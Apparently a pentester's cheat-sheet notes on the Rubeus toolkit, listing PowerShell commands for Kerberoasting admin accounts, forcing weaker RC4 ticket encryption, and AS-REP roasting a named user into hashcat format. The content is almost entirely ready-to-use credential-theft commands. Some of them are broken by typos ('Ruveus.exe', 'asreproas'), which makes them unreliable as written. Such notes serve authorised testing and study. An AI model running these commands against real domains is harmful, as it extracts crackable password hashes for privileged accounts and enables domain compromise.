-- -
C# toolkit for interacting with and abusing Kerberos. You can find the repo [here](https://github.com/GhostPack/Rubeus)
#### Simple Kerberoast
```powershell
# Will get the TGS for admin accounts
# no wrap just makes it easier to copy+paste as it won't require we
# trim the result for whitespace and newlines. 
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

# /tgtdeleg: Try to force weaker RC4 encryption
# only works on Windows Server 2016 and lower
# Windows server 2019 enforces highest excryption level by default.
.\Ruveus.exe kerberoast /tgtdeleg /user:testspn /nowrap
```

^93887f

#### ASREPRoasting
[[ASREPRoasting]]
```powershell
# get AS-REP in crackable format for account w/ kerberoas preauth turned off
.\Rubeus.exe asreproas /user:<user> /nowrap /format:<passwd cracker name>
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
```

^454f39
